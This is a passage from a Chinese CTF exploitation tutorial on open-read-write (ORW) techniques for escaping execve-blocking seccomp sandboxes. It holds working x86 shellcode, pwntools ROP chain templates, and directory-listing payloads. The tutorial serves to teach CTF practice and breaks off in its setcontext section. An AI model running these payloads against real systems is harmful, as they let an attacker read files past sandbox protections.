# 11 ORW 与沙箱绕过

## 本章速览

| 项目 | 说明 |
| ---- | ---- |
| 本章目标 | 题目用 seccomp 沙箱禁止了 `execve`，无法 getshell；改用 `open/read/write` 三个系统调用把 flag 文件直接读出来打印到 stdout |
| 一句话原理 | seccomp 拦的是"系统调用号"，不是"你有没有 shell"；读一个文件根本不需要 shell，三连系统调用足矣 |
| 前置知识 | 系统调用与传参（第 04 章）、ROP 基础（第 02/04 章）、SROP（第 07 章）、堆利用（第 10 章） |
| 必备工具 | `seccomp-tools`（还原沙箱规则）、`ROPgadget`、pwntools（shellcraft / ROP / SigreturnFrame） |
| 关键调用号（64 位） | open=2，read=0，write=1，openat=257，sendfile=40，getdents64=217，sigreturn=15，execve=59 |
| 关键调用号（32 位） | open=5，read=3，write=4，execve=11，int 0x80 触发 |
| 解法路线图 | shellcode 版 → ROP 版 → 分段 ROP → setcontext 版 → SROP 版 → libc 函数版（fopen/sendfile 等） |
| 章节地图 | 11.1 沙箱原理 → 11.2 系统调用基础 → 11.3 shellcode 版 → 11.4 ROP 版 → 11.5 setcontext → 11.6 SROP → 11.7 杂项方案 → 11.8 变种应对表 → 11.9 例题 → 11.10 常见坑 → 11.11 检查清单 |

---

## 11.1 为什么需要 ORW

### 11.1.1 沙箱之下的困境

CTF 后期题目普遍会在 `main` 一开始就安装一个 seccomp 沙箱，最常见的规则只有一条：**禁止 `execve`（59 号调用）**。这意味着：

- ret2syscall 打不通：即使控制了 `rax=59, rdi="/bin/sh"`，`syscall` 一执行，内核直接把进程杀掉（SIGKILL）或返回错误。
- ret2libc 打不通：`system("/bin/sh")` 底层就是 `execve`，同样被杀；one_gadget 也是。
- 但 read / write / open 等其他几十个系统调用畅通无阻。

```
以前的目标：                      被沙箱禁止后的目标：

  溢出 → system("/bin/sh")         溢出 → open("/flag", 0)
              │                              │
              v                              v
          execve(59)  ←── seccomp: KILL   read(3, buf, n)   ←── 放行
                                             │
                                             v
                                         write(1, buf, n)  ←── flag 打出来了
```

这就是 **ORW（Open-Read-Write）**：放弃交互式 shell，直接用三个系统调用完成"打开 flag → 读入内存 → 输出到屏幕"。flag 一到手，题目即通关。

> 小知识：ORW 也是一种更"高级"的攻击目标。现实中从 CTF 到真实漏洞利用，当沙箱（如 Chrome 的 seccomp-bpf、Docker 的默认 profile）限制了 execve 时，"读文件外传"就是标准替代动作。

### 11.1.2 seccomp 原理速讲

seccomp（secure computing mode）是 Linux 内核提供的系统调用过滤器，工作在**内核态**，所以无论你在用户态用裸 `syscall` 指令、glibc 封装函数还是别的什么方式发起调用，都会被同一套规则检查。

安装沙箱的标准两步（题目伪代码）：

```c
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>

// 1. 第一步必须先做：禁止子进程继承更高权限，否则 PR_SET_SECCOMP 会被拒绝
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);

// 2. 装载 BPF 规则（sock_fprog：一组 sock_filter 指令 + 长度）
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
// 新内核也常用 seccomp(SECCOMP_SET_MODE_FILTER, 0, &prog)，本质相同
```

BPF 规则本体是一个小程序：它把"系统调用号"装进累加器 A，逐条比较，最后返回一个裁决值。典型黑名单写法：

```c
struct sock_filter filter[] = {
    /* 校验架构，防 32 位调用号绕过 */
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
    /* 载入系统调用号 */
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
    /* nr == execve ? 杀 : 放行 */
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
};
struct sock_fprog prog = { .len = sizeof(filter)/sizeof(filter[0]), .filter = filter };
```

**两种模式，难度天差地别：**

| 模式 | 逻辑 | 破解思路 |
| ---- | ---- | ---- |
| 黑名单 | 默认 ALLOW，个别调用 KILL/ERRNO | 看清禁了谁：禁 execve 就 orw；禁 open 就 openat；禁 write 就 sendfile/writev |
| 白名单 | 默认 KILL，只放行少数调用 | 必须在允许的调用集合里凑齐 orw；集合里没有 getdents 就没法列目录 |

裁决值（BPF 返回的 K）速查：

| K 值 | 宏 | 行为 |
| ---- | -- | ---- |
| `0x00000000` | SECCOMP_RET_KILL | 杀掉**线程**（最常见的"被杀"） |
| `0x80000000` | SECCOMP_RET_KILL_PROCESS | 杀掉整个进程 |
| `0x00030000` | SECCOMP_RET_TRAP | 发 SIGSYS 信号（进程死给你看） |
| `0x00050000 \| errno` | SECCOMP_RET_ERRNO | 系统调用返回该 errno，比如 `0x00050001` = EPERM |
| `0x7fff0000` | SECCOMP_RET_ALLOW | 放行 |

> 注意 `RET_ERRNO` 这种软拦截：调用"失败"了但进程活着，表现为 `read` 返回 -1，容易被误判成"没有沙箱"。dump 一下最保险。

### 11.1.3 seccomp-tools dump 逐行解读

安装：`gem install seccomp-tools`。用法：

```bash
seccomp-tools dump ./pwn
# 若沙箱在"输入之后"才安装，需要先喂点输入触发到安装点
seccomp-tools dump ./pwn | tee seccomp.txt
```

**例 A：黑名单（只禁 execve）的典型输出**

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x01 0xc000003e  if (A != ARCH_x86_64) goto 0003
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x06 0x00 0x00 0x00000000  return KILL
```

逐行解读：

| 行 | 含义 |
| -- | ---- |
| 0000 | `0x20` 是 BPF 的"加载"指令，把 seccomp_data 偏移 4 的字段（**arch**，体系架构标记）装进累加器 A |
| 0001 | `0x15` 是"相等则跳"。K=`0xc000003e` 是 x86_64 的 arch 魔数；不等就跳到 0003（去杀），相等落到 0002。这一步防的是用 32 位调用号绕过 |
| 0002 | 加载偏移 0 的字段：**sys_number**（系统调用号） |
| 0003 | 调用号 == 0x3b（59，execve）？是 → 跳到 0005（杀）；否 → 落到 0004 |
| 0004 | 返回 `0x7fff0000` = ALLOW，放行 |
| 0005 | 返回 `0x00000000` = KILL，杀线程 |

结论：只杀 execve，直接上 ORW。

**例 B：白名单（只允许 open/read/write/close/exit/exit_group）的典型输出**

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x01 0xc000003e  if (A != ARCH_x86_64) goto 0003
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0008
 0004: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0008
 0005: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0008
 0006: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0008
 0007: 0x15 0x00 0x00 0x000000e7  if (A == exit_group) goto 0008
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```

解读要点：

- 0003~0007 连续五条 `if (A == X) goto 0008`，把 read(0)、write(1)、open(2)、exit(60)、exit_group(231=0xe7) 汇聚到 0008 的 ALLOW。
- 其他一切调用号落到 0009 → KILL。
- **这份白名单里没有 openat(257)**：意味着只能用 2 号 open（裸 syscall），glibc 的 `open()` 函数反而不能用（它底层走 openat，见 11.10 常见坑第 4 条）。
- 没有 getdents64(217)：没法列目录，flag 路径只能猜或从题面获取。

> 实战建议：拿到题先 `seccomp-tools dump`，把允许/禁止的调用号抄在草稿上，再决定用哪种 ORW 方案。这是 ORW 题的第一步，永远不要跳过。

---

## 11.2 ORW 系统调用基础

### 11.2.1 调用号与传参表

**64 位（amd64）**：调用号放 `rax`，参数依次放 `rdi, rsi, rdx, r10, r8, r9`，`syscall` 指令触发；返回值在 `rax`。

| 调用 | rax | rdi | rsi | rdx | r10 | 返回值 |
| ---- | --- | --- | --- | --- | --- | ------ |
| open | 2 | path 指针 | flags（O_RDONLY=0） | mode（可 0） | — | fd |
| read | 0 | fd | buf 指针 | count | — | 实际读到字节数 |
| write | 1 | fd | buf 指针 | count | — | 实际写出字节数 |
| openat | 257 | dirfd | path 指针 | flags | mode | fd |
| sendfile | 40 | out_fd | in_fd | offset 指针（传 0） | count | 传送字节数 |
| getdents64 | 217 | fd | buf 指针 | count | — | 读取字节数 |
| writev | 20 | fd | iovec 数组指针 | iovcnt | — | 字节数 |
| execve | 59 | path | argv | envp | — | （被禁） |

**32 位（i386）**：调用号放 `eax`，参数依次放 `ebx, ecx, edx, esi, edi, ebp`，`int 0x80` 触发。

| 调用 | eax | ebx | ecx | edx |
| ---- | --- | --- | --- | --- |
| open | 5 | path 指针 | flags | mode |
| read | 3 | fd | buf 指针 | count |
| write | 4 | fd | buf 指针 | count |
| execve | 11 | path | argv | envp |

> flags 取值：O_RDONLY=0，O_WRONLY=1，O_RDWR=2。读 flag 用 0 即可。

### 11.2.2 openat 替代：被禁 open 时的出路

现代 glibc 内部几乎都用 openat 实现文件打开，不少沙箱因此**只禁 open(2)、不禁 openat(257)**（或反过来）。

```
openat(dirfd, pathname, flags, mode)
       rdi=dirfd   rsi=path   rdx=flags   r10=mode
```

关键点：`dirfd` 传 **AT_FDCWD = -100**（64 位下即 `0xffffff9c`，注意传参时按符号扩展成 64 位 `0xffffffffffffff9c`）时，path 按相对当前工作目录解析——效果与 open 完全一致：

```
openat(-100, "/flag", O_RDONLY, 0)  ==  open("/flag", O_RDONLY)
```

代价：多了一个参数（r10 = mode），寄存器压力更大。shellcode 场景无感；ROP 场景需要 `pop r10` 类 gadget（较难找，可用 libc 的 `openat` 函数代替）。

### 11.2.3 read 的返回值与寄存器污染

`read` 的返回值是"实际读到的字节数"，放在 `rax`。两个实用结论：

1. **write 想写"刚读到的长度"**，就得把 rax 搬到 rdx：shellcode 里 `mov edx, eax`；ROP 里需要 `mov rdx, rax; ret` gadget（不好找）。
2. **偷懒方案**：write 的 count 直接写死一个较大的数（如 0x100）。flag 内容后面的脏数据会一起打出来，不影响拿 flag，但收数据时要自己过滤。
3. **反过来 read 也是污染源**：ORW 链中如果后续步骤还要用 rax（比如紧接着的 syscall 号），一定先确认它被覆盖了没有。这是 ORW 最经典的翻车点之一（详见 11.10）。

### 11.2.4 fd 从哪来：为什么一般假定 3

进程启动时 0/1/2（stdin/stdout/stderr）已打开，所以第一个 `open` 返回的 fd 几乎总是 **3**。这正是 ORW 链敢写死 `fd=3` 的原因。

但注意例外：

- 程序自己 close 掉了某个标准流（如 `close(1)` 反调试），fd 会前移；
- 程序在 open flag 之前还打开过别的文件；
- 部署环境（socat/xinetd）不同导致标准流指向不同（一般仍占 0/1/2，影响不大）。

稳妥做法：本地先跑通观察 `open` 的返回值；远程若 fd 不是 3，把链里写死的 3 换掉即可。shellcode 版则可以直接用 rax 里的真实返回值，不存在猜的问题。

### 11.2.5 文件名与路径的不确定性

ORW 的 payload 里有字符串参数，这是与 ret2shellcode/ret2libc 的最大差异——**文件名写错了，前功尽弃**：

- 本地 `/flag`，远程可能是 `./flag`、`/home/ctf/flag`、`/flag.txt`、`flag_随机串`；
- 文件名长度不定：ROP 版要安排它在内存里的落位，shellcode 版要 push 进栈；
- 可以先 `open(".") + getdents64` 列目录再决定（见 11.3.4）；
- 或者一次链里对多个候选路径各试一遍（fd 依次 3/4/5...，全 read 全 write，浪费但有效）。

> 经验法则：打远程前准备一个"路径探测"小脚本，把常见候选路径逐个 ORW 一遍，哪个出了内容用哪个。

---

## 11.3 shellcode 版 ORW（重点）

利用条件：

- 有一个可执行的区域能落 shellcode（NX 关闭的栈/堆、可执行 bss、mprotect/mmap 改出的 RWX 页、或沙箱白名单里恰好允许 mprotect/mmap）；
- 溢出点能把 RIP 引到 shellcode 上（jmp rsp/call rsp、无 PIE 固定地址、栈地址泄露等）。

shellcode 版是 ORW 里最灵活的形式：fd 用 rax 现取现用，文件名 push 进栈，不存在"写死 fd"和"字符串落位"问题。

### 11.3.1 手写 64 位 orw shellcode 逐条讲解

```asm
; ===================== 第 1 步：open("/flag", O_RDONLY) =====================
    xor     eax, eax
    push    rax                 ; 先压 8 字节 0：保证文件名以 \0 结尾
    mov     rax, 0x67616c662f   ; "/flag" 的十六进制（小端序）：2f 66 6c 61 67
    push    rax                 ; 压入后 rsp 指向 "/flag\0\0\0"
    mov     rdi, rsp            ; rdi = 文件名指针（栈上）
    xor     esi, esi            ; flags = O_RDONLY
    xor     edx, edx            ; mode  = 0
    mov     eax, 2              ; SYS_open = 2
    syscall                     ; 返回值 rax = fd，一般是 3

; ===================== 第 2 步：read(fd, buf, 0x100) ========================
    mov     rdi, rax            ; rdi = fd —— 关键！open 的返回值要用在这里
    xor     eax, eax            ; SYS_read = 0
    sub     rsp, 0x200          ; 在栈上再腾一块缓冲区
    mov     rsi, rsp            ; buf = rsp（覆盖文件名也无所谓，已经用完了）
    mov     edx, 0x100          ; 读取长度
    syscall                     ; rax = 实际读到的字节数

; ===================== 第 3 步：write(1, buf, len) ==========================
    mov     edx, eax            ; 长度 = read 的返回值（动态长度，输出干净）
    mov     rsi, rsp            ; buf
    mov     edi, 1              ; fd = 1 (stdout)
    mov     eax, 1              ; SYS_write = 1
    syscall

; ===================== 第 4 步：优雅退出 ====================================
    mov     eax, 60             ; SYS_exit
    xor     edi, edi
    syscall
```

逐条拆解要点：

1. **文件名入栈**：`push rax`（零）+ `push 0x67616c662f`。因为 x86 小端序，立即数的高位字节落在高地址，压栈后内存里正好是 `"/flag\0"`。文件名超过 8 字节就多 push 几段（注意从**字符串尾部**往前逐段构造）。这种手法避免了立即数里出现 `\x00`（push rax 先垫了零）。
2. **fd 传递**：open 返回后 fd 在 rax，`mov rdi, rax` 一行完成传递。**很多人在这里翻车**：中间插了一条别的指令把 rax 覆盖了，read 就读错 fd。
3. **缓冲区**：`sub rsp, 0x200` 往低地址开缓冲区。也可以用固定地址（如 bss），前提是知道地址。
4. **write 长度**：`mov edx, eax` 用上 read 的真实返回值，输出不含脏数据；图省事也可以写死 0x100。
5. **exit 可省**：shellcode 执行完哪怕崩了，stdout 也已通过 write 系统调用直接写出（不经 libc 缓冲），数据不会丢。加上 exit 只是让流程干净。

组装与验证：

```python
from pwn import *
context.arch = 'amd64'
context.os = 'linux'

sc = asm('''
    xor eax, eax
    push rax
    mov rax, 0x67616c662f
    push rax
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall
    mov rdi, rax
    xor eax, eax
    sub rsp, 0x200
    mov rsi, rsp
    mov edx, 0x100
    syscall
    mov edx, eax
    mov rsi, rsp
    mov edi, 1
    mov eax, 1
    syscall
    mov eax, 60
    xor edi, edi
    syscall
''')
print(len(sc), sc.hex())   # 看长度和坏字节
```

### 11.3.2 pwntools shellcraft 组装

pwntools 把上面整套流程封装成了 shellcraft，三行搞定：

```python
from pwn import *
context.arch = 'amd64'
context.os   = 'linux'

sc  = shellcraft.open('/flag')                 # open("/flag", 0, 0)，fd 留在 rax
sc += shellcraft.read('rax', 'rsp', 0x100)     # read(fd=rax, buf=rsp, 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)        # write(1, rsp, 0x100)
sc += shellcraft.exit(0)
shellcode = asm(sc)
```

说明：

- `shellcraft.open` 内部同样是"push 文件名 + 调 open"，字符串以 `\0` 结尾的问题它替你处理了；path 里不能含 `\0` 和换行（有坏字节需求时改用手写版）。
- `read/write` 的 buf 用 `'rsp'`：open 的 shellcraft 会 push 文件名而不 pop，rsp 恰好指向栈上数据区，read 直接写 rsp 处是安全的。
- 32 位版只需 `context.arch = 'i386'`，shellcraft 会自动换成 int 0x80 和 5/3/4 号调用：

```python
context.arch = 'i386'
sc  = shellcraft.open('/flag')
sc += shellcraft.read('eax', 'esp', 0x100)     # 32 位返回值在 eax
sc += shellcraft.write(1, 'esp', 0x100)
```

落地模板（栈可执行 + 无 PIE 的经典 ret2shellcode 场景，完整例题见 11.9 例题三）：

```python
io.sendlineafter(b'> ', b'0')                  # 触发漏洞选项等
payload = b'A' * 0x28                          # 填到返回地址
payload += p64(buf_addr)                       # 返回地址 = shellcode 所在处
io.sendline(payload + shellcode)               # shellcode 紧随其后
```

### 11.3.3 sendfile 优化版：少一次设置

`sendfile(out_fd, in_fd, offset, count)` 在**内核态**把 in_fd 的数据直接拷给 out_fd，跳过"read 进内存再 write 出去"的两次调用：

```
普通 orw：  flag 文件 ──read──> 内存 ──write──> stdout     （2 个调用 + 缓冲区）
sendfile：  flag 文件 ────────内核直接对拷────────> stdout （1 个调用，0 字节用户态缓冲）
```

```python
# 一行版：pwntools 的 shellcraft.cat 就是 open + sendfile 的封装
sc = shellcraft.cat('/flag')
```

手写 sendfile 段（接在 open 之后，fd 在 rax）：

```asm
    mov     rsi, rax            ; in_fd = open 的返回值
    mov     edi, 1              ; out_fd = stdout
    xor     edx, edx            ; offset = NULL（从文件头开始）
    push    0x1000
    pop     r10                 ; count = 0x1000（给大一点）
    mov     eax, 40             ; SYS_sendfile
    syscall
```

优点：寄存器只动 rdi/rsi/rdx/r10，比 read+write 组合短；ROP 场景下还能把 count 塞进 r10 省掉也不管（见 11.7.3）。

### 11.3.4 文件名未知：getdents64 列目录

flag 文件名带随机后缀（`flag_8a2b1c.txt`）或路径层级不明时，先列目录。流程：

```
open(".") ──> fd=3 ──> getdents64(3, buf, 0x1000) ──> write(1, buf, ret)
                                                        │
                              stdout 收到二进制 dirent 结构，肉眼/脚本抠出文件名
                                                        v
                                       再发一发完整 orw shellcode 打开真实路径
```

手写"列目录"shellcode：

```asm
    push    0x2e               ; "."，push imm8 会符号扩展成 8 字节：2e 00 00...
    mov     rdi, rsp           ; path = "."
    xor     esi, esi
    xor     edx, edx
    mov     eax, 2             ; open(".", O_RDONLY)
    syscall
    mov     rdi, rax           ; fd
    sub     rsp, 0x1000
    mov     rsi, rsp           ; buf
    mov     edx, 0x1000
    mov     eax, 217           ; SYS_getdents64
    syscall
    mov     edx, eax           ; 本次读到的 dirent 总字节数
    mov     rsi, rsp
    mov     edi, 1
    mov     eax, 1             ; write(1, buf, ret)
    syscall
    mov     eax, 60
    xor     edi, edi
    syscall
```

收到的是 `linux_dirent64` 结构数组：`d_ino(8) | d_off(8) | d_reclen(2) | d_type(1) | d_name(...)`，文件名在每条记录尾部，直接 `strings` 或写 10 行 python 解析即可。

**分两步交互法**（最省事的实战写法）：

```python
# 第 1 步：发列目录 shellcode，看文件名
io.sendline(asm(list_dir_sc))            # 上面那段
data = io.recvall(timeout=2)
print(data)                              # 肉眼找 flag 文件名

# 第 2 步：用真实路径发 orw shellcode
io = remote(HOST, PORT)                  # 重连，程序复位
io.sendline(asm(orw_sc('/home/ctf/flag_e39f.txt')))
print(io.recvall(timeout=2))
```

> 白名单里没有 getdents64 时这条路走不通，只能猜路径或从题面/容器常识推断（`/flag`、`/home/ctf/flag`、`./flag`）。

### 11.3.5 shellcode 版变体与坑

- **坏字节**：`read` 读入的 shellcode 遇 `\x0a` 会截断，scanf 类输入 `\x20/\x09/\x0b/\x0c` 也会截断。避免方法：立即数改用 push 分段、寄存器清零代替 `mov r, 0`、pwntools `asm()` 后检查 `b'\n' in sc`。
- **32 位 push 文件名**：`push 0x67616c662f` 在 32 位下只能压 4 字节，长文件名按 4 字节分段倒序 push，最后补 `push 0` 或利用已有零字节。
- **目录 shellcode 卡死**：getdents64 的 buf 用的 `rsp` 往下压过，如果 shellcode 又要接第二段交互，注意别覆盖还没执行的输入数据。

---

## 11.4 ROP 版 ORW

没有可执行内存时，把"orw 三连"翻译成一串寄存器设置 + `syscall` gadget。利用条件：

- 溢出长度足够（链很长，64 位一发至少 40~60 个 gadget 槽位，见下方分段讨论）；
- 找得到 `pop rdi/rsi/rdx/rax` 与 `syscall; ret`（静态二进制大量存在；动态题泄露 libc 后从 libc 里找）；
- 二进制或 libc 里有可写可读的地址放文件名/缓冲区（bss）。

### 11.4.1 64 位布局详解（栈图）

以静态链接、无 PIE、溢出 0x100 为例。文件名和缓冲区都放 bss（先用 `read@plt` 把 `"/flag\0"` 读进去，或者直接搜二进制里现成的字符串）。

```
低地址
+--------------------+ <== 溢出起点（原返回地址处）
| pop rdi ; ret      | ┐
| bss_path           | │ read(0, bss_path, 8)  ← 第 0 步：读入 "/flag\0"
| pop rsi ; ret      | │   （如果二进制里已有现成文件名字符串可跳过）
| bss_path           | │
| pop rdx ; ret      | │
| 8                  | │
| pop rax ; ret      | │
| 0  (SYS_read)      | │
| syscall ; ret      | ┘  ← ret 弹出下一行，链继续
+--------------------+
| pop rdi ; ret      | ┐
| bss_path           | │ open("/flag", 0, 0)
| pop rsi ; ret      | │
| 0                  | │
| pop rdx ; ret      | │
| 0                  | │
| pop rax ; ret      | │
| 2  (SYS_open)      | │
| syscall ; ret      | ┘  ← open 返回 fd=3，落在 rax（此时没人再碰 rax 就丢掉）
+--------------------+
| pop rdi ; ret      | ┐
| 3  (fd, 假定 3)     | │ read(3, bss_buf, 0x100)
| pop rsi ; ret      | │
| bss_buf            | │
| pop rdx ; ret      | │
| 0x100              | │
| pop rax ; ret      | │
| 0  (SYS_read)      | │
| syscall ; ret      | ┘
+--------------------+
| pop rdi ; ret      | ┐
| 1                  | │ write(1, bss_buf, 0x100)
| pop rsi ; ret      | │
| bss_buf            | │
| pop rdx ; ret      | │
| 0x100              | │
| pop rax ; ret      | │
| 1  (SYS_write)     | │
| syscall ; ret      | ┘
+--------------------+
| pop rax ; ret      |   exit 收尾（可省）
| 60                 |
| pop rdi ; ret      |
| 0                  |
| syscall            |
+--------------------+
高地址
```

pwntools 完整模板（逐行注释）：

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./pwn', checksec=False)
io  = process('./pwn')

# ---- 0. 收集 gadget（静态二进制全在主程序里；动态题换成 ROP(libc)）----
rop     = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]      # 若没有，找 'pop rdx; pop rbx; ret' 等组合
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]      # 纯 'syscall' 也行，但要放链尾
BSS     = elf.bss(0x800)                              # 挑一块冷清的 bss：0x800=文件名 0x900=buf

# ---- 1. 组链 ----
rop.raw(POP_RDI); rop.raw(0)            # read(0, bss, 8)  写入 "/flag\0"
rop.raw(POP_RSI); rop.raw(BSS)
rop.raw(POP_RDX); rop.raw(8)
rop.raw(POP_RAX); rop.raw(0)
rop.raw(SYSCALL)
rop.raw(POP_RDI); rop.raw(BSS)          # open("/flag", 0, 0)
rop.raw(POP_RSI); rop.raw(0)
rop.raw(POP_RDX); rop.raw(0)
rop.raw(POP_RAX); rop.raw(2)
rop.raw(SYSCALL)
rop.raw(POP_RDI); rop.raw(3)            # read(3, bss+0x100, 0x100)   fd 假定 3
rop.raw(POP_RSI); rop.raw(BSS + 0x100)
rop.raw(POP_RDX); rop.raw(0x100)
rop.raw(POP_RAX); rop.raw(0)
rop.raw(SYSCALL)
rop.raw(POP_RDI); rop.raw(1)            # write(1, bss+0x100, 0x100)
rop.raw(POP_RSI); rop.raw(BSS + 0x100)
rop.raw(POP_RDX); rop.raw(0x100)
rop.raw(POP_RAX); rop.raw(1)
rop.raw(SYSCALL)

payload = flat(b'A' * 0x28, rop.chain())   # 偏移按题目实际调
io.sendlineafter(b'>> ', payload)
io.send(b'/flag\x00')                      # 喂给第 0 步的 read
print(io.recvall(timeout=2))
```

### 11.4.2 32 位布局详解（栈图）

32 位传参在栈上（eax=调用号，ebx/ecx/edx=前三参），需要 `pop eax/ebx/ecx/edx; ret` 与 `int 0x80`：

```
低地址
+------------------+ <== 溢出起点
| pop eax ; ret    |
| 5  (SYS_open)    |
| pop ebx ; ret    |
| flag_path (bss)  |
| pop ecx ; ret    |
| 0  (O_RDONLY)    |
| pop edx ; ret    |
| 0                |
| int 0x80         |    open 返回 eax=3(fd)
+------------------+
| pop eax ; ret    |
| 3  (SYS_read)    |
| pop ebx ; ret    |
| 3  (fd)          |
| pop ecx ; ret    |
| buf (bss)        |
| pop edx ; ret    |
| 0x100            |
| int 0x80         |
+------------------+
| pop eax ; ret    |
| 4  (SYS_write)   |
| pop ebx ; ret    |
| 1                |
| pop ecx ; ret    |
| buf (bss)        |
| pop edx ; ret    |
| 0x100            |
| int 0x80         |
+------------------+
高地址
```

```python
from pwn import *
context.arch = 'i386'
elf = ELF('./pwn32', checksec=False)
rop = ROP(elf)
POP_EAX = rop.find_gadget(['pop eax', 'ret'])[0]
POP_EBX = rop.find_gadget(['pop ebx', 'ret'])[0]
POP_ECX = rop.find_gadget(['pop ecx', 'ret'])[0]
POP_EDX = rop.find_gadget(['pop edx', 'ret'])[0]
INT80   = rop.find_gadget(['int 0x80', 'ret'])[0]     # 32 位静态题必备
BSS     = elf.bss(0x400)

chain  = p32(POP_EAX) + p32(5)  + p32(POP_EBX) + p32(BSS) + p32(POP_ECX) + p32(0) + p32(POP_EDX) + p32(0) + p32(INT80)
chain += p32(POP_EAX) + p32(3)  + p32(POP_EBX) + p32(3)   + p32(POP_ECX) + p32(BSS+0x100) + p32(POP_EDX) + p32(0x100) + p32(INT80)
chain += p32(POP_EAX) + p32(4)  + p32(POP_EBX) + p32(1)   + p32(POP_ECX) + p32(BSS+0x100) + p32(POP_EDX) + p32(0x100) + p32(INT80)

payload = b'A' * 0x24 + chain + b'/flag\x00'   # 偏移与 bss 里字符串落位按实际调
```

> 32 位字符串落位小技巧：把 `"/flag\0"` 直接拼在链尾，把它的**确切地址**（借助溢出前的栈布局或干脆放 bss）算好填进 ebx。更稳的做法是第一段先用 `read@plt`/`gets@plt` 把字符串写进固定 bss，再跑 orw。

### 11.4.3 NX 栈 + 动态链接：从 libc 里借 gadget

二进制是动态链接时，主程序里通常没有 `syscall; ret` 和 `pop rax`。做法与 ret2libc 一致：

1. 先用 puts/printf 泄露并计算 libc 基址（见第 05 章）；
2. `ROP(libc)` 从 libc 里找全部 gadget——libc 有几十处 `syscall; ret`、`pop rax; ret`；
3. 文件名/缓冲区仍放二进制 bss（若开了全保护就用 libc 的可写段，地址 = libc 基址 + 偏移）。

```python
ROP_POP_RDI = libc.address + next(libc.search(asm('pop rdi; ret')))
ROP_SYSCALL = libc.address + next(libc.search(asm('syscall; ret')))
```

libc 里还有现成的 `open/read/write/sendfile` **函数**（不是 syscall 指令），可以直接 `rop.call(libc.sym['open'], [path, 0])`——不占 pop rax 的槽位，链更短，但要留意 11.10 坑 4（glibc open 底层走 openat，白名单只放 2 号时会失败）。

### 11.4.4 链太长放不下：两条出路

ORW 链在 64 位下单发要 30+ 个槽位（约 0x100+ 字节），溢出空间不够时：

**出路一：分段 ROP**——每轮只完成"一段"，做完一个 syscall 后**返回 vuln 函数重新触发溢出**，用下一轮 payload 续。寄存器在函数重入间会被打乱，所以每轮把本轮需要的寄存器全部重新设置。详见 11.9 例题四。

```
第 1 轮 payload: [gets(bss) 写文件名] ──ret──> vuln   ← 重新溢出
第 2 轮 payload: [open(bss)]         ──ret──> vuln   ← 重新溢出
第 3 轮 payload: [read(3, buf)]      ──ret──> vuln
第 4 轮 payload: [write(1, buf)]     ──ret──> 结束
```

**出路二：栈迁移**——`leave; ret` 或 `pop rsp; ret` 把 rsp 挪到 bss/堆上，那里空间管够，一次放全链（套路见第 07 章）。

**出路三：setcontext**——不用一格格填寄存器，一次"寄存器全家桶"恢复（见 11.5），现代堆题标配。

---

## 11.5 setcontext + ORW 专题（现代堆题标配）

### 11.5.1 setcontext+53 gadget 原理

glibc 的 `setcontext` 函数本意是恢复信号上下文 ucontext_t：把一整块内存里的"寄存器快照"批量恢复到 CPU。而在 `setcontext` 偏移 53 处起，恰好是从 `[rdi+X]` 批量取值的代码段，且执行到 `ret` 前不会返回原调用流——这就是著名的 **setcontext+53**。

libc 2.27（Ubuntu 18.04）实测反汇编（以 objdump 实际输出为准）：

```asm
<setcontext+53>:
    mov  rsp, QWORD PTR [rdi+0xa0]   ; ★ 栈指针 = 快照里的 rsp
    mov  rbx, QWORD PTR [rdi+0x80]
    mov  rbp, QWORD PTR [rdi+0x78]
    mov  r12, QWORD PTR [rdi+0x48]
    mov  r13, QWORD PTR [rdi+0x50]
    mov  r14, QWORD PTR [rdi+0x58]
    mov  r15, QWORD PTR [rdi+0x60]
    test DWORD PTR fs:0x48, 0x2      ; shadow stack 检查，通常不命中
    ...
    mov  rcx, QWORD PTR [rdi+0xa8]   ; ★ 取"返回地址"
    push rcx                         ;   压栈
    mov  rsi, QWORD PTR [rdi+0x70]   ; ★ rsi
    mov  rdx, QWORD PTR [rdi+0x88]   ; ★ rdx
    mov  rcx, QWORD PTR [rdi+0x98]
    mov  r8,  QWORD PTR [rdi+0x28]
    mov  r9,  QWORD PTR [rdi+0x30]
    mov  rdi, QWORD PTR [rdi+0x68]   ; ★ rdi（最后才恢复，所以基地址 rdi 不会再被用）
    xor  eax, eax
    ret                              ; 弹出 [rdi+0xa8] 当作 rip，"跳"过去
```

**效果：只要让 `rdi` 指向我们伪造的一块内存（fake ucontext），一条 gadget 就能同时控制 rsp / rip / rdi / rsi / rdx 等几乎全部寄存器。** 关键偏移表：

